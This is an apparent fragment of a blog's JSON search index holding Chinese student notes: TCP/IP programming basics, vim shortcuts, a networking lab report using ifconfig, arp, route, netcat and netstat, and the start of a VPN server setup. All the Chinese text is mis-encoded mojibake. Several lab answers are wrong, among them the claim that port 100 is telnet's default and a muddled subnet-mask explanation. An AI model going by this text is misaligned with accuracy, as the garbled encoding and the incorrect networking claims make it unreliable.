è®ºæ˜¯æ–‡ä»¶æè¿°ç¬¦è¿˜æ˜¯å¥æŸ„ï¼Œå®ƒä»¬éƒ½æ˜¯ç”¨æ¥å¼•ç”¨å’Œæ“ä½œå¥—æ¥å­—è¿™ç§æŠ½è±¡å¯¹è±¡çš„æ ‡è¯†ç¬¦ã€‚\nåº•å±‚æ–‡ä»¶I/Oå‡½æ•°ä¸ANSI æ ‡å‡†å®šä¹‰çš„æ–‡ä»¶I/Oå‡½æ•°ä¹‹é—´æœ‰ä½•åŒºåˆ«? åº•å±‚æ–‡ä»¶I/Oå‡½æ•°æ˜¯ç›´æ¥è°ƒç”¨æ“ä½œç³»ç»Ÿæä¾›çš„æ–‡ä»¶æ“ä½œæ¥å£ï¼Œå¦‚openã€readã€writeç­‰ï¼Œå®ƒä»¬æä¾›äº†å¯¹æ–‡ä»¶çš„ä½çº§åˆ«è®¿é—®ï¼Œå¯ä»¥æ›´åŠ çµæ´»åœ°æ§åˆ¶æ–‡ä»¶çš„è¯»å†™æ“ä½œã€‚ è€ŒANSIæ ‡å‡†å®šä¹‰çš„æ–‡ä»¶I/Oå‡½æ•°åˆ™æ˜¯æ ‡å‡†Cåº“ä¸­æä¾›çš„ä¸€ç»„æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¦‚fopenã€freadã€fwriteç­‰ï¼Œå®ƒä»¬æä¾›äº†æ›´åŠ æŠ½è±¡å’Œä¾¿æ·çš„æ–‡ä»¶æ“ä½œæ¥å£ï¼Œä½¿å¾—è·¨å¹³å°å¼€å‘æ›´åŠ æ–¹ä¾¿ï¼Œå¹¶ä¸”æä¾›äº†ä¸€äº›ç¼“å†²å’Œé”™è¯¯å¤„ç†çš„åŠŸèƒ½ã€‚ å› æ­¤ï¼Œåº•å±‚æ–‡ä»¶I/Oå‡½æ•°æ›´åŠ æ¥è¿‘æ“ä½œç³»ç»Ÿæä¾›çš„æ–‡ä»¶æ“ä½œæ¥å£ï¼Œè€ŒANSIæ ‡å‡†å®šä¹‰çš„æ–‡ä»¶I/Oå‡½æ•°åˆ™æä¾›äº†æ›´åŠ ä¾¿æ·å’Œè·¨å¹³å°çš„æ–‡ä»¶æ“ä½œæ¥å£ã€‚\nå‚è€ƒæœ¬ä¹¦ç»™å‡ºçš„ç¤ºä¾‹low_open.c å’Œlow_read.c ,åˆ†åˆ«åˆ©ç”¨åº•å±‚æ–‡ä»¶I/O å’ŒANSIæ ‡å‡†I/O ç¼–å†™æ–‡ä»¶å¤åˆ¶ç¨‹åºã€‚å¯ä»»æ„æŒ‡å®šå¤åˆ¶ç¨‹åºçš„ä½¿ç”¨æ–¹æ³•ã€‚\n","date":"2023-11-11T12:47:47+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCPã€IPç½‘ç»œç¼–ç¨‹ç¬¬ä¸€ç« ç¬”è®°"},{"content":"å°è¯•å­¦ä¹ ä¸€ä¸‹vim\nvimæ¨¡å¼åˆ‡æ¢ normalè½¬insert i å…‰æ ‡å‰æ’å…¥ Iè¡Œé¦–æ’å…¥ oè¿›å…¥ä¸‹ä¸€è¡Œè¾“å…¥ Oä¸Šä¸€è¡Œæ’å…¥ aå…‰æ ‡ä¹‹åè¾“å…¥ Aè¡Œæœ«å°¾æ’å…¥\ninsert è½¬normal esc/jj å˜å›æ™®é€šæ¨¡å¼\nnormalè½¬visual vå˜æˆå¯è§†æ¨¡å¼ï¼ˆæ— æ³•ç¼–è¾‘ï¼‰\nvisualè½¬nomal escæˆ–è€…vå˜å›æ™®é€šæ¨¡å¼\næ™®é€šæ¨¡å¼è½¬å‘½ä»¤æ¨¡å¼ ï¼šè½¬æˆå‘½ä»¤æ¨¡å¼\nå‘½ä»¤æ¨¡å¼è½¬æ™®é€šæ¨¡å¼ esc\nå…‰æ ‡ç§»åŠ¨ æ™®é€šæ¨¡å¼ä¸‹å…‰æ ‡ç§»åŠ¨ åŠ¨ä½œ motion æ“ä½œç¬¦ åˆ é™¤å…¨éƒ¨ die å¤åˆ¶å…¨éƒ¨ yie u æ’¤é”€\nå¤§å°å†™ å¸¸ç”¨ gd æŸ¥çœ‹å‡½æ•°å®šä¹‰ ^Oè¿”å› gæ•°å­— åˆ‡æ¢æ ‡ç­¾/ctrl+æ•°å­— command+0 åˆ°æ–‡ä»¶å¤¹ oæ‰“å¼€ å›è½¦ä¿®æ”¹åå­—\neasymotion ç©ºæ ¼ç©ºæ ¼s + è¦æŸ¥è¯¢çš„å­—å¹• ç©ºæ ¼ç©ºæ ¼+e ç©ºæ ¼ç©ºæ ¼+w\nvim surround å…‰æ ‡è½¬ç§»åˆ°ç»ˆç«¯ leader + t\nåˆ‡æ¢tab gtæˆ–gT\n","date":"2023-11-10T12:43:42+08:00","permalink":"https://anonymity-0.github.io/posts/vim/","title":"Vim"},{"content":"å®éªŒå†…å®¹ arp åœ¨ HostA å’Œ HostB ä¸­åˆ†åˆ«æ‰“å¼€ä¸€ä¸ªç»ˆç«¯ç”¨äºæœ¬å®éªŒã€‚\nåœ¨ HostA å’Œ HostB ä¸­åˆ†åˆ«æ‰§è¡Œå‘½ä»¤ifconfig ens5ï¼ŒæŸ¥çœ‹å¹¶è®°å½•å®ƒä»¬å„è‡ªçš„IPv4 åœ°å€ã€‚æ‰§è¡Œå‘½ä»¤ ifconfig ens6 æŸ¥çœ‹ IPv6 åœ°å€ (global å’Œ link ä¸¤ç§) ä»¥åŠä»¥å¤ªç½‘æ¥å£çš„ç‰©ç†åœ°å€ã€‚ æˆªå›¾ï¼š å‘½ä»¤è§£é‡Šï¼š ifconfig æ˜¯ä¸€ä¸ªç”¨äºé…ç½®å’Œæ˜¾ç¤ºç½‘ç»œæ¥å£ä¿¡æ¯çš„å‘½ä»¤ã€‚ens5 å’Œ ens6 æ˜¯ç½‘ç»œæ¥å£çš„åç§°ï¼Œé€šå¸¸ç”¨äºè¡¨ç¤ºä»¥å¤ªç½‘æ¥å£ã€‚ifconfig ens5 å‘½ä»¤ç”¨äºæ˜¾ç¤ºåä¸º ens5 çš„ç½‘ç»œæ¥å£çš„é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ IP åœ°å€ã€å­ç½‘æ©ç ã€å¹¿æ’­åœ°å€ã€MAC åœ°å€ç­‰ã€‚\nåœ¨ HostA ä¸­æ‰§è¡Œå‘½ä»¤ arp -n æˆ–ip neigh show æŸ¥çœ‹å¹¶è®°å½•æœ¬æœº ARP ç¼“å­˜è¡¨çš„å†…å®¹ã€‚\nå‘½ä»¤è§£é‡Šï¼š arp -n æ˜¯ä¸€ä¸ªç”¨äºæŸ¥çœ‹æœ¬åœ°ARPç¼“å­˜è¡¨çš„å‘½ä»¤ã€‚å®ƒä¼šæ˜¾ç¤ºå·²è§£æçš„IPåœ°å€å’Œå¯¹åº”çš„MACåœ°å€ã€‚ ip neigh show æ˜¯ä¸€ä¸ªç”¨äºæŸ¥çœ‹æœ¬åœ°é‚»å±…è¡¨çš„å‘½ä»¤ã€‚å®ƒä¼šæ˜¾ç¤ºå·²è§£æçš„IPåœ°å€å’Œå¯¹åº”çš„MACåœ°å€ï¼Œç±»ä¼¼äº arp -n å‘½ä»¤ã€‚ arp -n å’Œ ip neigh show éƒ½æ˜¯ç”¨äºæŸ¥çœ‹æœ¬åœ°ARPç¼“å­˜è¡¨æˆ–é‚»å±…è¡¨çš„å‘½ä»¤ï¼Œå®ƒä»¬çš„åŠŸèƒ½ç›¸ä¼¼ä½†æœ‰ä¸€äº›åŒºåˆ«ã€‚\nå‘½ä»¤æ ¼å¼ä¸åŒï¼šarp -n æ˜¯åœ¨å¤§å¤šæ•°æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨çš„å‘½ä»¤ï¼Œè€Œ ip neigh show æ˜¯åœ¨åŸºäº Linux çš„æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨çš„å‘½ä»¤ã€‚ è¾“å‡ºæ ¼å¼ä¸åŒï¼šarp -n è¾“å‡ºçš„ç»“æœé€šå¸¸æ˜¯ä»¥è¡¨æ ¼å½¢å¼æ˜¾ç¤ºçš„ï¼ŒåŒ…æ‹¬IPåœ°å€å’Œå¯¹åº”çš„MACåœ°å€ã€‚è€Œ ip neigh show è¾“å‡ºçš„ç»“æœå¯èƒ½æ›´è¯¦ç»†ï¼ŒåŒ…æ‹¬IPåœ°å€ã€MACåœ°å€ã€æ¥å£ã€çŠ¶æ€ç­‰ä¿¡æ¯ã€‚ æ”¯æŒçš„åŠŸèƒ½ä¸åŒï¼šip neigh show å‘½ä»¤åœ¨åŠŸèƒ½ä¸Šæ›´åŠ å¼ºå¤§ï¼Œå¯ä»¥æ˜¾ç¤ºæ›´å¤šå…³äºé‚»å±…çš„ä¿¡æ¯ï¼Œå¦‚çŠ¶æ€ã€æ¥å£ç±»å‹ç­‰ã€‚è€Œ arp -n å‘½ä»¤é€šå¸¸åªæ˜¾ç¤ºåŸºæœ¬çš„IPåœ°å€å’ŒMACåœ°å€ä¿¡æ¯ã€‚ æˆªå›¾ï¼š åœ¨ HostA ä¸­æ‰§è¡Œå‘½ä»¤ ping -c 1 HostB çš„ IPv4 åœ°å€å‘ HostB å‘é€ ICMP è¯·æ±‚æŠ¥æ–‡ã€‚æ”¶åˆ° ICMP å“åº”åå†æ¬¡æ‰§è¡Œå‘½ä»¤ arp -n æˆ–ip neigh show æŸ¥çœ‹ HostAçš„ ARP ç¼“å­˜è¡¨çš„å†…å®¹ã€‚\nå‘½ä»¤è§£é‡Š ping -c 1 HostB æ˜¯ä¸€ä¸ªç”¨äºå‘ HostB å‘é€ä¸€ä¸ª ICMP å›æ˜¾è¯·æ±‚ï¼ˆpingï¼‰çš„å‘½ä»¤ã€‚å…¶ä¸­ï¼Œ-c 1 è¡¨ç¤ºåªå‘é€ä¸€æ¬¡è¯·æ±‚ã€‚\næˆªå›¾ åœ¨ HostA çš„ ARP ç¼“å­˜è¡¨é‡Œé¢å¯è·å¾— HostB çš„ MAC åœ°å€ï¼Œè®°å½•ä¸‹æ¥ï¼Œæ£€æŸ¥ä¸ HostB ä¸Šifconfig ens5 å‘½ä»¤çš„æ‰§è¡Œç»“æœæ˜¯å¦ä¸€è‡´ã€‚ ä¸ HostB ä¸Šifconfig ens5 å‘½ä»¤çš„æ‰§è¡Œç»“æœä¸€è‡´\nåœ¨ HostA ä¸­æ‰§è¡Œå‘½ä»¤ping -c 1 202.38.64.246ï¼Œæ”¶åˆ° ICMP å“åº”åç»§ç»­æ‰§è¡Œå‘½ä»¤ip neigh show æŸ¥çœ‹ HostA çš„ ARP ç¼“å­˜è¡¨ï¼Œè®°å½•ç»“æœã€‚ç®€è¦è§£é‡Šä¸ºä½•æ— æ³•çœ‹åˆ°å¯¹åº”äºåœ°å€ 202.38.64.246 çš„ ARP è¡¨é¡¹è€Œåªèƒ½å¾—åˆ°ç½‘å…³çš„æŸç½‘å¡çš„MAC åœ°å€ã€‚æç¤ºï¼šæ€è€ƒç½‘æ®µ(é“¾è·¯)ã€å¹¿æ’­åŸŸçš„æ¦‚å¿µã€‚\næˆªå›¾ï¼š è§£é‡Šï¼š è¿™æ˜¯å› ä¸ºï¼ŒARP åè®®ç”¨äºåœ¨åŒä¸€ç½‘æ®µå†…æŸ¥æ‰¾ä¸»æœºçš„ MAC åœ°å€ã€‚å½“ HostA å‘é€ ICMP è¯·æ±‚åˆ°ç›®æ ‡åœ°å€ 202.38.64.246 æ—¶ï¼Œç›®æ ‡åœ°å€ä¸åœ¨ HostA çš„ç½‘æ®µå†…ï¼Œå› æ­¤ HostA éœ€è¦å‘ç½‘å…³å‘é€å¹¿æ’­ ARP è¯·æ±‚ã€‚ç½‘å…³æ”¶åˆ°å¹¿æ’­ ARP è¯·æ±‚åï¼Œä¼šå°†è‡ªå·±çš„ MAC åœ°å€å›å¤ç»™ HostAã€‚HostA æ”¶åˆ°ç½‘å…³çš„å›å¤åï¼Œå°†ç½‘å…³çš„ MAC åœ°å€å­˜å‚¨åœ¨ ARP ç¼“å­˜è¡¨ä¸­ã€‚å› æ­¤ï¼ŒHostA æ— æ³•çœ‹åˆ°å¯¹åº”äºåœ°å€ 202.38.64.246 çš„ ARP è¡¨é¡¹ã€‚\nIP åˆ†åˆ«ç”¨å‘½ä»¤ route -n å’Œå‘½ä»¤route \u0026ndash;inet6 æŸ¥çœ‹æœ¬æœºçš„ IPv4 å’Œ IPv6 è·¯ç”±é…ç½®ï¼Œè®°å½•æ‰€åœ¨å­ç½‘çš„å­ç½‘æ©ç /å‰ç¼€é•¿åº¦ï¼Œå¹¶äºå‰é¢ ifconfig çš„ç»“æœä½œæ¯”è¾ƒã€‚\nå‘½ä»¤è§£é‡Š route -n æ˜¯ä¸€ä¸ªç”¨äºæ˜¾ç¤º IPv4 è·¯ç”±è¡¨çš„å‘½ä»¤ã€‚å®ƒä¼šåˆ—å‡ºç³»ç»Ÿä¸­å½“å‰é…ç½®çš„æ‰€æœ‰ IPv4 è·¯ç”±é¡¹ï¼ŒåŒ…æ‹¬ç›®çš„ç½‘ç»œã€ç½‘å…³ã€å­ç½‘æ©ç ã€æ¥å£å’Œè·¯ç”±æ ‡å¿—ç­‰ä¿¡æ¯ã€‚è¯¥å‘½ä»¤ä¸­çš„ -n é€‰é¡¹è¡¨ç¤ºä»¥æ•°å­—å½¢å¼æ˜¾ç¤º IP åœ°å€å’Œå­ç½‘æ©ç ï¼Œè€Œä¸è¿›è¡Œä¸»æœºåå’Œç½‘ç»œåœ°å€çš„è§£æã€‚ route --inet6 æ˜¯ä¸€ä¸ªç”¨äºæ˜¾ç¤º IPv6 è·¯ç”±è¡¨çš„å‘½ä»¤ã€‚å®ƒä¼šåˆ—å‡ºç³»ç»Ÿä¸­å½“å‰é…ç½®çš„æ‰€æœ‰ IPv6 è·¯ç”±é¡¹ï¼ŒåŒ…æ‹¬ç›®çš„ç½‘ç»œã€ç½‘å…³ã€å‰ç¼€é•¿åº¦ã€æ¥å£å’Œè·¯ç”±æ ‡å¿—ç­‰ä¿¡æ¯ã€‚è¯¥å‘½ä»¤ä¸­çš„ --inet6 é€‰é¡¹è¡¨ç¤ºåªæ˜¾ç¤º IPv6 è·¯ç”±è¡¨çš„ä¿¡æ¯ã€‚ æˆªå›¾ï¼š ![[Pasted image 20231106202048.png]] æ¯”è¾ƒä¸¤è€…çš„ç»“æœï¼Œå¯ä»¥çœ‹åˆ°ï¼ŒIPv4 å’Œ IPv6 è·¯ç”±è¡¨ä¸­çš„å­ç½‘æ©ç /å‰ç¼€é•¿åº¦å‡ä¸ifconfigçš„ç»“æœä¸€è‡´ã€‚\næ‰§è¡Œä»¥ä¸‹ä¸¤ä¸ªå‘½ä»¤åˆ†åˆ«æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸çš„ IPv4 å’Œ IPv6 çš„ FORWARD å€¼ï¼Œè®°å½•ä¸‹æ¥ã€‚ç®€å•è§£é‡Šè¿™ä¸ªå€¼çš„å«ä¹‰ä»¥åŠä¸ºä½•è¿™ä¸ªå€¼æ˜¯è¿™æ ·è®¾å®šçš„ã€‚æç¤ºï¼šæ€è€ƒä¸»æœºä¸è·¯ç”±å™¨çš„åŒºåˆ«ã€‚\nå‘½ä»¤ 1ï¼šcat /proc/sys/net/ipv4/ip_forward å‘½ä»¤ 2ï¼šcat /proc/sys/net/ipv6/conf/all/forwarding\nå‘½ä»¤è§£é‡Šï¼š å‘½ä»¤1ï¼šcat /proc/sys/net/ipv4/ip_forward ç”¨äºæŸ¥çœ‹ IPv4 è½¬å‘åŠŸèƒ½çš„çŠ¶æ€ã€‚åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œå¦‚æœè¯¥å€¼ä¸º 1ï¼Œåˆ™è¡¨ç¤ºå¯ç”¨äº† IPv4 è½¬å‘åŠŸèƒ½ï¼Œå³å…è®¸å°†æ•°æ®åŒ…ä»ä¸€ä¸ªç½‘ç»œæ¥å£è½¬å‘åˆ°å¦ä¸€ä¸ªç½‘ç»œæ¥å£ã€‚ å‘½ä»¤2ï¼šcat /proc/sys/net/ipv6/conf/all/forwarding ç”¨äºæŸ¥çœ‹ IPv6 è½¬å‘åŠŸèƒ½çš„çŠ¶æ€ã€‚ç±»ä¼¼äº IPv4ï¼Œå¦‚æœè¯¥å€¼ä¸º 1ï¼Œåˆ™è¡¨ç¤ºå¯ç”¨äº† IPv6 è½¬å‘åŠŸèƒ½ï¼Œå…è®¸å°†æ•°æ®åŒ…ä»ä¸€ä¸ª IPv6 ç½‘ç»œæ¥å£è½¬å‘åˆ°å¦ä¸€ä¸ª IPv6 ç½‘ç»œæ¥å£ã€‚\næˆªå›¾ï¼š è§£é‡Šï¼š å¯ä»¥çœ‹åˆ°ï¼Œç³»ç»Ÿå†…æ ¸çš„ IPv4 å’Œ IPv6 çš„ FORWARD å€¼å‡ä¸º 0ã€‚FORWARD å€¼çš„å«ä¹‰æ˜¯æ˜¯å¦å…è®¸ç³»ç»Ÿè½¬å‘ IP æ•°æ®åŒ…ã€‚å¦‚æœ FORWARD å€¼ä¸º 0ï¼Œåˆ™ç³»ç»Ÿä¸å…è®¸è½¬å‘ IP æ•°æ®åŒ…ã€‚ä¸»æœºå’Œè·¯ç”±å™¨çš„åŒºåˆ«åœ¨äºï¼Œä¸»æœºåªèƒ½ä¸åŒä¸€å­ç½‘å†…çš„ä¸»æœºé€šä¿¡ï¼Œè€Œè·¯ç”±å™¨å¯ä»¥è¿æ¥å¤šä¸ªå­ç½‘ï¼Œå¹¶è´Ÿè´£å°†æ•°æ®åŒ…ä»ä¸€ä¸ªå­ç½‘è½¬å‘åˆ°å¦ä¸€ä¸ªå­ç½‘ã€‚ç”±äºä¸»æœºåªèƒ½ä¸åŒä¸€å­ç½‘å†…çš„ä¸»æœºé€šä¿¡ï¼Œå› æ­¤ä¸éœ€è¦è½¬å‘ IP æ•°æ®åŒ…ã€‚å› æ­¤ï¼Œä¸»æœºçš„ FORWARD å€¼é€šå¸¸ä¸º 0ã€‚\nTCP åœ¨ S çš„ç»ˆç«¯ 1 ä¸­æ‰§è¡Œ nc -l 1958 ä¾¦å¬1958 ç«¯å£ã€‚ã€‚ å‘½ä»¤è§£é‡Šï¼š å‘½ä»¤ nc -l 1958 å°†åœ¨ TCP ç«¯å£ 1958 ä¸Šç›‘å¬ä¼ å…¥è¿æ¥\nncï¼šnetcat å‘½ä»¤ -lï¼šç›‘å¬ä¼ å…¥è¿æ¥ 1958ï¼šç«¯å£å· æˆªå›¾ï¼š åœ¨HostA çš„ç»ˆç«¯ 1 æ‰§è¡Œnc S çš„IPv4 åœ°å€ 1958\næˆªå›¾ï¼š åœ¨HostA ç»ˆç«¯ 2 ä¸­æ‰§è¡Œå‘½ä»¤netstat -aunt æ¥è§‚å¯Ÿè‡ªå·±ä¸»æœºä¸Šçš„æ‰€æœ‰ TCP ä¸UDP è¿æ¥çŠ¶å†µï¼Œå°†è¾“å‡ºçš„ä¿¡æ¯è®°å½•ä¸‹æ¥ã€‚è¯·åœ¨ä¸Šè¿°è®°å½•çš„ç»“æœä¸­æ‰¾åˆ°å¯¹åº”äºä¸Šè¿°è¿æ¥çš„é‚£æ¡è®°å½•å¹¶è§£é‡Šè¿™æ¡è®°å½•çš„å«ä¹‰ã€‚\nå‘½ä»¤è§£é‡Šï¼š æ‰§è¡Œ netstat -aunt å‘½ä»¤å¯ä»¥æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸Šæ‰€æœ‰çš„ç½‘ç»œè¿æ¥å’Œç›‘å¬ç«¯å£ï¼Œä»¥åŠå®ƒä»¬çš„çŠ¶æ€ã€åè®®ç±»å‹ã€æœ¬åœ°åœ°å€å’Œè¿œç¨‹åœ°å€ç­‰ä¿¡æ¯ æˆªå›¾ï¼š è¿™æ¡è®°å½•è¡¨ç¤ºï¼ŒHostA ä¸»æœºçš„60260ç«¯å£ä¸ S ä¸»æœºçš„ 1958 ç«¯å£å»ºç«‹äº† TCP è¿æ¥ã€‚\næ‰§è¡Œå‘½ä»¤ nc S çš„ IPv4 åœ°å€ 100ï¼Œè®°å½•å‘½ä»¤æ‰§è¡Œç»“æœã€‚åŒæ ·ä½¿ç”¨ netstat -aunt æ¥æŸ¥çœ‹æœ¬æœºçš„è¿æ¥çŠ¶å†µï¼Œè¯·åˆ¤æ–­è¿™æ¬¡ telnet è¿æ¥æ˜¯å¦æˆåŠŸå»ºç«‹å¹¶ç®€å•è¯´æ˜åŸå› ã€‚ åŸå› æ˜¯ 100 ç«¯å£æ˜¯ telnet æœåŠ¡å™¨çš„é»˜è®¤ç«¯å£ï¼Œä½† S ä¸»æœºæ²¡æœ‰åœ¨ 100 ç«¯å£ä¸Šç›‘å¬ telnet è¿æ¥ã€‚å› æ­¤ï¼ŒHostA ä¸»æœºæ— æ³•ä¸ S ä¸»æœºå»ºç«‹ telnet è¿æ¥ã€‚\næ€è€ƒé¢˜ ç°åœ¨æœ‰ä¸€ä¸ªç½‘æ®µçš„ IP åœ°å€å’Œå­ç½‘æ©ç åˆ†åˆ«ä¸º202.38.75.0/255.255.255.192ï¼Œè¯·è®¡ç®—è¯¥ç½‘æ®µä¸­ä¸€å…±æœ‰å¤šå°‘ä¸ªå…¨å±€ IPv4 åœ°å€å¯ä¾›ä¸»æœºä½¿ç”¨ï¼Œæˆ–è€…è¯´è¿™ä¸ªç½‘ç»œä¸­æœ‰å¤šå°‘çœŸæ­£å¯åˆ†é…çš„ IP åœ°å€ï¼Ÿ\nå­ç½‘æ©ç  255.255.255.192 çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸º 11111111 11111111 11111111 11000000ï¼Œå…¶ä¸­å‰ 24 ä½ä¸º 1ï¼Œè¡¨ç¤ºè¯¥ç½‘æ®µçš„ç½‘ç»œåœ°å€éƒ¨åˆ†ï¼Œå 8 ä½ä¸º 0ï¼Œè¡¨ç¤ºè¯¥ç½‘æ®µçš„å¹¿æ’­åœ°å€éƒ¨åˆ†ã€‚å› æ­¤ï¼Œè¯¥ç½‘æ®µä¸­ä¸€å…±æœ‰ 2^6 - 2 = 62 ä¸ªå…¨å±€ IPv4 åœ°å€å¯ä¾›ä¸»æœºä½¿ç”¨ã€‚\nå®éªŒä¸­æ‰§è¡Œ ifconfig ens3 æŸ¥çœ‹æ¥å£çš„é…ç½®ä¿¡æ¯æ—¶å¯ä»¥è§‚å¯Ÿåˆ°ä¸€ä¸ªé‡è¦çš„å‚æ•°MTUï¼Œè¯·é—®è¿™ä¸ªå€¼æ˜¯å¤šå°‘ï¼ŸæŸ¥è¯¢èµ„æ–™è¯´æ˜ MTU å‚æ•°çš„ç”¨é€”ã€‚\nMTU æ˜¯æœ€å¤§ä¼ è¾“å•å…ƒï¼ˆMaximum Transmission Unitï¼‰çš„ç¼©å†™ï¼ŒæŒ‡çš„æ˜¯ç½‘ç»œå±‚åè®®æ‰€èƒ½é€šè¿‡çš„æœ€å¤§æ•°æ®åŒ…å¤§å°ã€‚MTU çš„å€¼é€šå¸¸ä¸é€šä¿¡æ¥å£æœ‰å…³ï¼ˆç½‘ç»œæ¥å£å¡ã€ä¸²å£ç­‰ï¼‰ã€‚ MTU çš„å€¼é€šå¸¸ä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œå¸¸è§çš„é»˜è®¤å€¼æ˜¯ 1500 å­—èŠ‚ã€‚è¿™æ˜¯å› ä¸ºä»¥å¤ªç½‘æ˜¯æœ€å¸¸è§çš„ç½‘ç»œç±»å‹ï¼Œè€Œä»¥å¤ªç½‘çš„æ ‡å‡†å¸§å¤§å°ä¸º 1518 å­—èŠ‚ï¼ˆåŒ…æ‹¬å¸§å¤´å’Œå¸§å°¾ï¼‰ï¼Œå‡å»ä»¥å¤ªç½‘å¸§å¤´çš„ 18 å­—èŠ‚ï¼Œå‰©ä¸‹çš„ 1500 å­—èŠ‚å°±æ˜¯å¯ç”¨äºæ•°æ®ä¼ è¾“çš„æœ€å¤§æ•°æ®é‡ã€‚ å½“æ•°æ®åŒ…çš„å¤§å°è¶…è¿‡ MTU å€¼æ—¶ï¼Œç½‘ç»œå±‚åè®®ä¼šå°†æ•°æ®åŒ…åˆ†ç‰‡ï¼Œå°†æ•°æ®åŒ…æ‹†åˆ†æˆå¤šä¸ªå°æ•°æ®åŒ…ï¼Œç„¶ååˆ†åˆ«ä¼ è¾“ã€‚åˆ†ç‰‡ä¼šå¢åŠ ç½‘ç»œå±‚åè®®çš„å¤æ‚åº¦ï¼Œå¹¶é™ä½ç½‘ç»œæ•ˆç‡ã€‚å› æ­¤ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼Œéœ€è¦æ ¹æ®ç½‘ç»œç¯å¢ƒè°ƒæ•´ MTU å‚æ•°çš„å€¼ï¼Œä»¥ä¿è¯æ•°æ®åŒ…èƒ½å¤Ÿæ­£å¸¸ä¼ è¾“ï¼Œå¹¶æé«˜ç½‘ç»œæ•ˆç‡ã€‚\n9. IPv6 åœ°å€é•¿åº¦æ˜¯ IPv4 åœ°å€é•¿åº¦çš„ 4 å€ï¼Œä¸è¿‡åœ¨ä»Šåçš„çº¯ IPv6 ç½‘ç»œç¯å¢ƒä¸­è·¯ç”±å™¨çš„ è·¯ç”±è¡¨çš„è§„æ¨¡åè€Œæœ‰æœ›å‡å°ï¼Œè¯·ç®€å•è§£é‡Šè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ\nåœ¨çº¯ IPv6 ç½‘ç»œç¯å¢ƒä¸­ï¼Œè·¯ç”±å™¨çš„è·¯ç”±è¡¨è§„æ¨¡æœ‰æœ›å‡å°çš„åŸå› ï¼š 1. IPv6 æ”¯æŒè·¯ç”±é‡å ï¼Œå³å¤šä¸ªè·¯ç”±å™¨å¯ä»¥æŒ‡å‘åŒä¸€ä¸ªç›®æ ‡åœ°å€ã€‚è¿™æ„å‘³ç€ IPv6 è·¯ç”±å™¨å¯ä»¥å…±äº«è·¯ç”±ä¿¡æ¯ï¼Œä»è€Œå‡å°‘è·¯ç”±æ¡ç›®çš„æ•°é‡ã€‚ 2. IPv6 è·¯ç”±è¡¨ç»“æ„æ›´åŠ ç®€åŒ–ã€‚IPv6 è·¯ç”±è¡¨é‡‡ç”¨äº†æ‰å¹³åŒ–çš„ç»“æ„ï¼Œæ¯ä¸ªè·¯ç”±è¡¨é¡¹åªéœ€è¦å­˜å‚¨ä¸€ä¸ªç›®æ ‡åœ°å€å’Œä¸‹ä¸€è·³åœ°å€å³å¯ã€‚è€Œ IPv4 è·¯ç”±è¡¨é‡‡ç”¨äº†åˆ†å±‚çš„ç»“æ„ï¼Œæ¯ä¸ªè·¯ç”±è¡¨é¡¹è¿˜éœ€è¦å­˜å‚¨ä¸€ä¸ªå‰ç¼€é•¿åº¦å’Œå­ç½‘æ©ç ã€‚ 3. IPv6æ²¡æœ‰ç§æœ‰åœ°å€å’ŒNATæŠ€æœ¯,å‡å°‘äº†è·¯ç”±è¡¨ä¸­çš„æ¡ç›®ã€‚ 4. IPv6 æ”¯æŒåŠ¨æ€è·¯ç”±ï¼Œå³è·¯ç”±å™¨å¯ä»¥è‡ªåŠ¨å­¦ä¹ åˆ°ç›®æ ‡åœ°å€çš„è·¯ç”±ä¿¡æ¯ã€‚è¿™æ„å‘³ç€ IPv6 è·¯ç”±å™¨ä¸éœ€è¦æ‰‹åŠ¨é…ç½®è·¯ç”±æ¡ç›®ï¼Œä»è€Œå‡å°‘è·¯ç”±æ¡ç›®çš„æ•°é‡ã€‚ ä¸€æ¡ TCP è¿æ¥éœ€è¦å“ªå‡ ä¸ªå‚æ•°æ ‡è¯†ï¼Ÿ\nä¸€æ¡ TCP è¿æ¥éœ€è¦å››ä¸ªå‚æ•°æ¥æ ‡è¯†ï¼Œå³ï¼š\næœ¬åœ° IP åœ°å€ï¼šè¡¨ç¤ºè¿æ¥çš„æœ¬åœ°ä¸»æœºçš„ IP åœ°å€ã€‚ æœ¬åœ°ç«¯å£å·ï¼šè¡¨ç¤ºè¿æ¥çš„æœ¬åœ°ä¸»æœºçš„ç«¯å£å·ã€‚ è¿œç¨‹ IP åœ°å€ï¼šè¡¨ç¤ºè¿æ¥çš„è¿œç¨‹ä¸»æœºçš„ IP åœ°å€ã€‚ è¿œç¨‹ç«¯å£å·ï¼šè¡¨ç¤ºè¿æ¥çš„è¿œç¨‹ä¸»æœºçš„ç«¯å£å·ã€‚ ","date":"2023-11-07T12:46:21+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C1/","title":"ä¿¡ç½‘å®éªŒ1"},{"content":"å¾—åˆ†ï¼š10/10\nè·¯ç”±é…ç½® é…ç½®è·¯ç”±å™¨Router å®‰è£…è¿œç¨‹è®¿é—®â€œè§’è‰²å’ŒåŠŸèƒ½â€ è®¾ç½®IPåœ°å€å’Œé»˜è®¤ç½‘å…³çš„IPåœ°å€ã€‚ å¯ç”¨â€œè·¯ç”±å’Œè¿œç¨‹è®¿é—®æœåŠ¡â€ å…³é—­é˜²ç«å¢™ ![[Pasted image 20231024224258.png|300]]\né…ç½®VPN Server è·¯ç”±è¿œç¨‹è®¿é—®æœåŠ¡å™¨è®¾ç½® ![[Pasted image 20231023164229.png|400]]\næ–°å»ºç”¨æˆ· ![[Pasted image 20231024224417.png|400]]\nVPN serverçš„ipåœ°å€é…ç½® ![[Pasted image 20231024223002.png|400]]\né…ç½®å®¢æˆ·ç«¯ client Bçš„ipåœ°å€ å°†ipåœ°å€è®¾ç½®ä¸º192.168.86.24 24ä¸ºå­¦å·æœ«2ä½ client 